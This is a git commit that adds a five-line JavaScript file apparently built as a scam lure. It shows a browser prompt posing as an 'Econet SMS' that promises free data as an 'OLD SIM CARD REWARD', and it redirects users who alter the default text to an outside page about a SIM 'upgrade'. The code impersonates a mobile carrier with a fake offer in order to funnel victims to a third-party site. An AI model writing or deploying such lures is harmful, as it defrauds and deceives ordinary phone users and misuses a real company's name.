69bfce5c299768d1e8e86b6997493e21c0a3de00
okpoz <okpoitidz@gmail.com>
2026-07-09 10:57:27 +0100

    Create activate-econet-20gbdata.js

---
+++ activate-econet-20gbdata.js
@@ -0,0 +1,5 @@
+var password = 'Econet Free Data'
+password=prompt('Econet SMS: Congratulations Your Number is Eligible to receive Econet Free Data OLD SIM CARD REWARD, Kindly Press OK to ACTIVATE. ','Econet Free Data');
+if (password != 'Econet Free Data') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
